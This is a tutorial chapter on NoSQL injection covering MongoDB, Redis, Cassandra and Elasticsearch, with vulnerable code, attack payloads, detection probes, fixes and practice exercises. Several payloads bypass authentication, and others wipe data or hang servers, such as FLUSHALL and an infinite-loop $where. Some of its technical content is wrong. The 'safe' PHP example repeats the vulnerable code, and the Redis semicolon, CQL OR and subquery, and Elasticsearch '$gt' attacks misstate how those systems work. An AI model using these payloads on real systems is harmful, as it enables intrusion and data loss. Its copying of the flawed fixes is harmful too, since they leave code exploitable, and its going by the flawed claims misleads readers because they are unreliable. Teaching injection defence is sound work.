# 21 - NoSQL Injection

## Overview

NoSQL injection targets non-relational databases like MongoDB, Redis, Cassandra, and Elasticsearch. Unlike SQL injection, NoSQL databases use different query languages and data structures, but they are equally vulnerable to injection attacks when user input is not properly sanitized.

## MongoDB Injection

### Understanding MongoDB Queries

MongoDB uses JSON-like documents for queries. When applications construct queries using string concatenation or improper parameterization, injection vulnerabilities occur.

**Normal Query:**

```javascript
db.users.find({
  username: 'admin',
  password: 'secret123'
})
```

### Basic Injection

**Vulnerable Code (PHP):**

```php
$query = [
  'username' => $_GET['username'],
  'password' => $_GET['password']
];
$users = $collection->find($query);
```

**Attack Payload:**

```
?username[$ne]=1&password[$ne]=1
```

**Resulting Query:**

```javascript
{
  username: {$ne: 1},  // Not equal to 1 (always true for strings)
  password: {$ne: 1}   // Not equal to 1 (always true for strings)
}
```

**Impact:** Authentication bypass - returns all users

### MongoDB Operators for Injection

| Operator  | Meaning              | Injection Use           |
| --------- | -------------------- | ----------------------- |
| `$eq`     | Equals               | Bypass exact match      |
| `$ne`     | Not equal            | Always true conditions  |
| `$gt`     | Greater than         | Numeric bypass          |
| `$lt`     | Less than            | Numeric bypass          |
| `$exists` | Field exists         | Check field presence    |
| `$regex`  | Regular expression   | Pattern matching bypass |
| `$where`  | JavaScript execution | **Code execution**      |

### Authentication Bypass

**Method 1: $ne Operator**

```
POST /login
username[$ne]=admin&password[$ne]=password
```

**Method 2: $gt Operator**

```
POST /login
username[$gt]=&password[$gt]=
```

**Method 3: $regex Operator**

```
POST /login
username[$regex]=.*&password[$regex]=.*
```

### Data Extraction

**Extract All Users:**

```
GET /api/users?id[$ne]=
```

**Find Admin Users:**

```
GET /api/users?role[$regex]=^admin
```

**Boolean-Based Blind:**

```
GET /api/users?id=1&username[$regex]=^a.*
```

- If response contains user: username starts with 'a'
- If empty: starts with different character

### JavaScript Injection via $where

**Vulnerable Code:**

```php
$query = [
  '$where' => "this.username == '" . $_GET['username'] . "'"
];
```

**Attack Payload:**

```
?username='; return true; var a='
```

**Result:**

```javascript
this.username == ''
return true
var a = ''
```

**Impact:** Bypasses all checks, returns all documents

**Data Extraction via $where:**

```
?username='; while(true){}; '
```

- Causes denial of service (infinite loop)

```
?username='; sleep(5000); '
```

- Time-based detection (if enabled)

### Prevention for MongoDB

**Use Proper Parameterization:**

```php
// PHP with MongoDB driver
$query = [
  'username' => $_GET['username'],  // Driver handles sanitization
  'password' => $_GET['password']
];
```

**Disable $where:**

```javascript
// MongoDB configuration
db.adminCommand({
  setParameter: 1,
  javascriptEnabled: false
})
```

**Input Validation:**

```php
function validateUsername($username) {
  if (!is_string($username) || strlen($username) > 50) {
    throw new Exception("Invalid username");
  }
  return $username;
}
```

## Redis Injection

### Understanding Redis Commands

Redis is a key-value store. Injection occurs when user input is used to construct Redis commands.

**Vulnerable Code (Python):**

```python
import redis

r = redis.Redis()
user_input = request.args.get('key')
# DANGEROUS: Direct command execution
result = r.execute_command(f"GET {user_input}")
```

### Redis Command Injection

**Payload:**

```
key=mykey; FLUSHALL;
```

**Result:**

```
GET mykey; FLUSHALL;
```

**Impact:** Data deletion (FLUSHALL removes all keys)

### Redis Exploitation

**Information Extraction:**

```
?key=mykey; INFO;
```

- Returns Redis server information

**Configuration Disclosure:**

```
?key=mykey; CONFIG GET *;
```

- Returns all configuration settings

**Write Operations:**

```
?key=mykey; SET hacked true;
```

- Creates new keys

**Denial of Service:**

```
?key=mykey; DEBUG SEGFAULT;
```

- Crashes Redis server (if enabled)

### Lua Script Injection

Redis supports Lua scripting for atomic operations.

**Vulnerable Code:**

```python
script = f"return redis.call('get', '{user_input}')"
result = r.eval(script, 0)
```

**Attack:**

```
key='); redis.call('set', 'hacked', 'true'); return redis.call('get', '
```

**Impact:** Arbitrary Redis commands via Lua

### Prevention for Redis

**Use Redis Commands Properly:**

```python
# Safe - Redis client handles escaping
result = r.get(user_input)
```

**Command Whitelist:**

```python
ALLOWED_COMMANDS = ['GET', 'SET', 'DEL']

def safe_execute(command, key):
    if command not in ALLOWED_COMMANDS:
        raise Exception("Command not allowed")
    return r.execute_command(command, key)
```

**Disable Dangerous Commands:**

```
# redis.conf
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command DEBUG ""
```

## Cassandra (CQL) Injection

### Understanding CQL

Cassandra Query Language (CQL) is similar to SQL but with key differences. It's vulnerable to similar injection techniques.

**Normal Query:**

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'secret';
```

### Basic Injection

**Vulnerable Code:**

```python
query = f"SELECT * FROM users WHERE username = '{username}'"
session.execute(query)
```

**Attack Payload:**

```
username' OR '1'='1'--
```

**Result:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'--'
```

**Impact:** Returns all users (authentication bypass)

### CQL-Specific Techniques

**UNION Not Supported:**
Cassandra doesn't support UNION, but other techniques work.

**ALLOW FILTERING Abuse:**

```
' ALLOW FILTERING; --
```

**Secondary Index Exploitation:**

```
' AND field IN (SELECT field FROM other_table); --
```

### Time-Based Blind Injection

**Using Built-in Functions:**

```
' AND blobAsBigint(timestampAsBlob(now())) > 0 --
```

### Prevention for Cassandra

**Use Prepared Statements:**

```python
# Python with cassandra-driver
query = "SELECT * FROM users WHERE username = ?"
session.execute(query, [username])
```

**Input Validation:**

```python
import re

def validate_cql_input(value):
    if re.search(r'[;\-\']', value):
        raise ValueError("Invalid characters in input")
    return value
```

## Elasticsearch Injection

### Understanding Elasticsearch Queries

Elasticsearch uses JSON-based Query DSL. Injection occurs when user input is embedded in query JSON.

**Normal Query:**

```json
{
  "query": {
    "match": {
      "username": "admin"
    }
  }
}
```

### JSON Injection

**Vulnerable Code:**

```python
query = {
  "query": {
    "match": {
      "username": request.args.get('username')
    }
  }
}
es.search(index="users", body=query)
```

**Attack via JSON Manipulation:**

```
?username={"$gt": ""}
```

**Result:**

```json
{
  "query": {
    "match": {
      "username": { "$gt": "" }
    }
  }
}
```

**Impact:** Returns all documents (empty string comparison always true for non-empty fields)

### Script Injection

Elasticsearch supports scripted fields for dynamic calculations.

**Vulnerable Query:**

```json
{
  "script_fields": {
    "result": {
      "script": {
        "lang": "painless",
        "source": "doc['field'].value * " + user_input
      }
    }
  }
}
```

**Attack Payload:**

```
1; doc['password'].value;
```

**Impact:** Extracts password field through script execution

### Elasticsearch Search Template Injection

**Vulnerable Template:**

```json
{
  "source": {
    "query": {
      "match": {
        "username": "{{username}}"
      }
    }
  }
}
```

**Attack:**

```
username": {"match_all": {}}}
```

**Impact:** Returns all documents

### Prevention for Elasticsearch

**Use Parameterized Queries:**

```python
# Elasticsearch DSL handles parameterization
query = {
  "query": {
    "match": {
      "username": username  # Safe
    }
  }
}
```

**Disable Dynamic Scripting:**

```yaml
# elasticsearch.yml
script.inline: false
script.indexed: false
script.file: false
```

**Input Validation:**

```python
def validate_search_input(value):
    if not isinstance(value, str):
        raise ValueError("Invalid input type")
    if '{' in value or '}' in value:
        raise ValueError("JSON characters not allowed")
    return value
```

## Detection Techniques

### MongoDB Detection

**Test Operators:**

```
?id[$ne]=1
?id[$exists]=true
?id[$regex]=.*
```

**Error Messages:**

- "unknown operator" → MongoDB confirmed
- "bad query" → Query parsing error

### Redis Detection

**Command Injection Test:**

```
?key=test; PING;
```

**Response Analysis:**

- PONG response → Command injection confirmed
- Error → Might still be vulnerable to other techniques

### Cassandra Detection

**Standard SQLi Tests Work:**

```
?id=1' AND 1=1--
?id=1' AND 1=2--
```

**CQL-Specific:**

```
?field=token('partition_key')
```

### Elasticsearch Detection

**JSON Injection Test:**

```
?q={"match_all": {}}
```

**Response Analysis:**

- All documents returned → Injection confirmed
- Parse error → JSON injection possible

## Practice Exercises

### Exercise 1: MongoDB Authentication Bypass

**Setup:**

- Node.js application with MongoDB
- Login form vulnerable to operator injection

**Task:**

1. Identify MongoDB backend
2. Use `$ne` operator to bypass authentication
3. Access admin account

**Payload:**

```
POST /login
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

### Exercise 2: Redis Command Injection

**Setup:**

- Application with Redis cache
- Key lookup vulnerable to command injection

**Task:**

1. Inject Redis commands via key parameter
2. Extract server information
3. List all keys in database

**Payload:**

```
GET /cache?key=mykey; KEYS *;
```

### Exercise 3: Elasticsearch Script Injection

**Setup:**

- Search application using Elasticsearch
- Script fields enabled

**Task:**

1. Identify Elasticsearch backend
2. Use script fields to extract data
3. Access documents not in search results

**Payload:**

```json
{
  "script_fields": {
    "result": {
      "script": "doc['hidden_field'].value"
    }
  }
}
```

## Key Takeaways

1. **NoSQL databases are equally vulnerable** - Just different syntax
2. **JSON-based queries** - Open to object injection attacks
3. **Operators like $ne, $gt** - Can create always-true conditions
4. **JavaScript/Lua scripting** - Enables code execution in MongoDB/Redis
5. **Prevention is similar** - Parameterization and input validation

## Comparison: SQL vs NoSQL Injection

| Aspect             | SQL Injection       | NoSQL Injection        |
| ------------------ | ------------------- | ---------------------- |
| **Query Language** | SQL statements      | JSON/BSON objects      |
| **Comment Syntax** | `--`, `/* */`       | Not applicable         |
| **Boolean Logic**  | `OR 1=1`            | `$ne`, `$gt` operators |
| **Union Attacks**  | `UNION SELECT`      | Not supported          |
| **Code Execution** | xp_cmdshell, etc.   | $where, Lua scripts    |
| **Prevention**     | Prepared statements | Proper driver usage    |

## Next Step

Continue to [22 - Cheat Sheet](22-Cheat-Sheet.md) for quick reference to all SQL injection techniques covered in this curriculum.
